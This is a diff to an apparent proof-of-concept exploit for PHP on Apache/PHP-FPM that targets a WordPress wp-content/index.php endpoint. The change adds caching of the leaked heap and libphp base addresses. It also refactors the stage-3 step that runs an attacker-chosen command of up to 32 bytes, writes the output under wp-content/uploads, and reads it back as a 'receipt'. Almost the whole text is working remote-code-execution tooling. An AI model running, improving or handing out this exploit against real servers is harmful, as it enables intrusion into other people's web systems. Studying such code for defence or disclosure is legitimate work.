@@ -16,6 +16,8 @@ from __future__ import annotations
 
 import argparse
 import collections
+import json
+import os
 import secrets
 import socket
 import ssl
@@ -25,6 +27,7 @@ import time
 import urllib.parse
 from collections.abc import Iterable
 from dataclasses import dataclass
+from pathlib import Path
 
 
 PROFILE = {
@@ -64,6 +67,82 @@ SID = b"attacksessionid0001"
 
 class PocError(RuntimeError):
     pass
+
+
+def default_base_cache_path() -> Path:
+    root = os.environ.get("XDG_CACHE_HOME")
+    if not root:
+        root = str(Path.home() / ".cache")
+    return Path(root) / "php2shell-stx" / "apache-bases-v1.json"
+
+
+def base_cache_key(
+    scheme: str, host: str, port: int, endpoint: str, profile: str
+) -> str:
+    return f"{profile}|{scheme}://{host}:{port}{endpoint}"
+
+
+def load_cached_bases(path: Path, key: str) -> tuple[int, int] | None:
+    try:
+        document = json.loads(path.read_text(encoding="utf-8"))
+        entry = document["targets"][key]
+        heap = int(entry["heap"], 16)
+        libphp = int(entry["libphp"], 16)
+    except (
+        OSError,
+        ValueError,
+        KeyError,
+        TypeError,
+        AttributeError,
+        json.JSONDecodeError,
+    ):
+        return None
+    if document.get("version") != 1:
+        return None
+    if heap & 0x1FFFFF or libphp & 0xFFF:
+        return None
+    if not (0x700000000000 <= heap < 0x800000000000):
+        return None
+    if not (0x700000000000 <= libphp < 0x800000000000):
+        return None
+    return heap, libphp
+
+
+def save_cached_bases(path: Path, key: str, heap: int, libphp: int) -> None:
+    document: dict[str, object] = {"version": 1, "targets": {}}
+    try:
+        existing = json.loads(path.read_text(encoding="utf-8"))
+        if existing.get("version") == 1 and isinstance(existing.get("targets"), dict):
+            document = existing
+    except (OSError, json.JSONDecodeError, AttributeError):
+        pass
+    targets = document["targets"]
+    assert isinstance(targets, dict)
+    targets[key] = {
+        "heap": hex(heap),
+        "libphp": hex(libphp),
+        "saved_at": int(time.time()),
+    }
+    path.parent.mkdir(mode=0o700, parents=True, exist_ok=True)
+    temporary = path.with_suffix(path.suffix + f".{os.getpid()}.tmp")
+    temporary.write_text(json.dumps(document, indent=2) + "\n", encoding="utf-8")
+    temporary.chmod(0o600)
+    temporary.replace(path)
+
+
+def discard_cached_bases(path: Path, key: str) -> None:
+    try:
+        document = json.loads(path.read_text(encoding="utf-8"))
+        targets = document.get("targets", {})
+        if not isinstance(targets, dict) or key not in targets:
+            return
+        del targets[key]
+        temporary = path.with_suffix(path.suffix + f".{os.getpid()}.tmp")
+        temporary.write_text(json.dumps(document, indent=2) + "\n", encoding="utf-8")
+        temporary.chmod(0o600)
+        temporary.replace(path)
+    except (OSError, json.JSONDecodeError, AttributeError):
+        return
 
 
 def parse_url(url: str) -> tuple[str, str, int, str]:
@@ -424,12 +503,78 @@ def command_receipt_plan(endpoint: str, command: str) -> tuple[str, str] | None:
     clean = endpoint.split("?", 1)[0]
     if not clean.endswith("/wp-content/index.php"):
         return None
-    token = secrets.token_hex(1)
+    prefix = f"({command})>wp-content/uploads/"
+    available = 32 - len(prefix.encode())
+    if available < 2:
+        return None
+    token = secrets.token_hex(min(4, available // 2))
     receipt = clean.rsplit("/", 1)[0] + f"/uploads/{token}"
-    wrapped = f"({command})>wp-content/uploads/{token}"
+    wrapped = prefix + token
     if len(wrapped.encode()) > 32:
         return None
     return wrapped, receipt
+
+
+def run_apache_stage3(
+    host: str,
+    port: int,
+    endpoint: str,
+    timeout: float,
+    follow_attempts: int,
+    command: str,
+    heap: int,
+    libphp: int,
+    receipt_path: str | None,
+    receipt_marker: bytes | None,
+    *,
+    source: str,
+) -> bool:
+    print(
+        f"[*] stage3 bases={source} heap={heap:#x} libphp={libphp:#x}",
+        flush=True,
+    )
+    follow_body = build_follow_body(command, heap, libphp)
+    arm_response = stage3_arm(host, port, endpoint, timeout)
+    arm_status, _, _ = split_response(arm_response)
+    print(f"[*] stage3 arm status={status_code(arm_status)}", flush=True)
+    if status_code(arm_status) != 500:
+        return False
+
+    for attempt in range(1, follow_attempts + 1):
+        response = stage3_follow(host, port, endpoint, follow_body, timeout)
+        status, _, body = split_response(response)
+        observed, output = inline_receipt(response)
+        print(
+            f"[*] stage3 follow={attempt} status={status_code(status)} "
+            f"body={len(body)} inline_receipt={int(observed)}",
+            flush=True,
+        )
+        if observed:
+            print(f"[+] COMMAND_OUTPUT: {output}")
+            return True
+        if receipt_path is not None and status_code(status) == 0:
+            for _ in range(3):
+                receipt_status, receipt_body = get(host, port, receipt_path, timeout)
+                if status_code(receipt_status) == 200 and (
+                    receipt_marker is None or receipt_marker in receipt_body
+                ):
+                    text = receipt_body.decode("latin1", "replace").strip()
+                    print(f"[+] HTTP_RECEIPT path={receipt_path} status=200")
+                    print(f"[+] COMMAND_OUTPUT: {text}")
+                    return True
+                time.sleep(0.05)
+            return False
+
+    if receipt_path is not None:
+        receipt_status, receipt_body = get(host, port, receipt_path, timeout)
+        if status_code(receipt_status) == 200 and (
+            receipt_marker is None or receipt_marker in receipt_body
+        ):
+            text = receipt_body.decode("latin1", "replace").strip()
+            print(f"[+] HTTP_RECEIPT path={receipt_path} status=200")
+            print(f"[+] COMMAND_OUTPUT: {text}")
+            return True
+    return False
 
 
 # Exact Debian PHP-FPM application-time parsing profile. These helpers are
@@ -1021,6 +1166,17 @@ def main() -> int:
     parser.add_argument("--attempts", type=int, default=12)
     parser.add_argument("--follow-attempts", type=int, default=12)
     parser.add_argument("--timeout", type=float, default=180)
+    parser.add_argument(
+        "--base-cache",
+        type=Path,
+        default=default_base_cache_path(),
+        help="local Apache base cache used within one master-process lifetime",
+    )
+    parser.add_argument(
+        "--no-base-cache",
+        action="store_true",
+        help="ignore and do not update the local Apache base cache",
+    )
     args = parser.parse_args()
     if args.attempts < 1 or args.follow_attempts < 1:
         parser.error("attempt counts must be positive")
@@ -1086,6 +1242,39 @@ def main() -> int:
     if len(command.encode()) > 32:
         raise PocError("command exceeds the calibrated 32-byte carrier")
 
+    cache_key = base_cache_key(
+        scheme, host, port, endpoint, str(PROFILE["name"])
+    )
+    if not args.no_base_cache and receipt_path is not None:
+        cached = load_cached_bases(args.base_cache, cache_key)
+        if cached is not None:
+            heap, libphp = cached
+            print(
+                f"[*] base-cache hit path={args.base_cache}; "
+                "validating with an independent receipt",
+                flush=True,
+            )
+            if run_apache_stage3(
+                host,
+                port,
+                endpoint,
+                args.timeout,
+                args.follow_attempts,
+                command,
+                heap,
+                libphp,
+                receipt_path,
+                receipt_marker,
+                source="cache",
+            ):
+                return 0
+            print(
+                "[!] cached bases did not produce a receipt; "
+                "discarding them and retrying the disclosure chain",
+                flush=True,
+            )
+            discard_cached_bases(args.base_cache, cache_key)
+
     arm_response = stage1_arm(host, port, endpoint, args.timeout)
     arm_status, _, _ = split_response(arm_response)
     print(f"[*] stage1 arm status={arm_status.decode('latin1', 'replace')!r}", flush=True)
@@ -1111,46 +1300,27 @@ def main() -> int:
         )
         break
     if not heap or not libphp:
-        raise PocError("no Stage 2 disclosure within the attempt bound; cause undetermined")
+        raise PocError("stage2 did not reach the armed worker within the attempt bound")
 
-    follow_body = build_follow_body(command, heap, libphp)
-    arm_response = stage3_arm(host, port, endpoint, args.timeout)
-    arm_status, _, _ = split_response(arm_response)
-    print(f"[*] stage3 arm status={status_code(arm_status)}", flush=True)
-    if status_code(arm_status) != 500:
-        raise PocError("stage3 arm did not produce the expected OOM response")
+    if not args.no_base_cache:
+        save_cached_bases(args.base_cache, cache_key, heap, libphp)
+        print(f"[*] base-cache updated path={args.base_cache}", flush=True)
 
-    for attempt in range(1, args.follow_attempts + 1):
-        response = stage3_follow(host, port, endpoint, follow_body, args.timeout)
-        status, _, body = split_response(response)
-        observed, output = inline_receipt(response)
-        print(
-            f"[*] stage3 follow={attempt} status={status_code(status)} "
-            f"body={len(body)} inline_receipt={int(observed)}",
-            flush=True,
-        )
-        if observed:
-            print(f"[+] COMMAND_OUTPUT: {output}")
-            return 0
-        if receipt_path is not None and status_code(status) == 0:
-            receipt_status, receipt_body = get(host, port, receipt_path, args.timeout)
-            if status_code(receipt_status) == 200 and (
-                receipt_marker is None or receipt_marker in receipt_body
-            ):
-                text = receipt_body.decode("latin1", "replace").strip()
-                print(f"[+] HTTP_RECEIPT path={receipt_path} status=200")
-                print(f"[+] COMMAND_OUTPUT: {text}")
-                return 0
-
+    if run_apache_stage3(
+        host,
+        port,
+        endpoint,
+        args.timeout,
+        args.follow_attempts,
+        command,
+        heap,
+        libphp,
+        receipt_path,
+        receipt_marker,
+        source="fresh-disclosure",
+    ):
+        return 0
     if receipt_path is not None:
-        receipt_status, receipt_body = get(host, port, receipt_path, args.timeout)
-        if status_code(receipt_status) == 200 and (
-            receipt_marker is None or receipt_marker in receipt_body
-        ):
-            text = receipt_body.decode("latin1", "replace").strip()
-            print(f"[+] HTTP_RECEIPT path={receipt_path} status=200")
-            print(f"[+] COMMAND_OUTPUT: {text}")
-            return 0
         raise PocError("no independent HTTP command receipt within the attempt bound")
     raise PocError(
         "no inline command receipt; this buffered profile requires -verify or an external receipt"
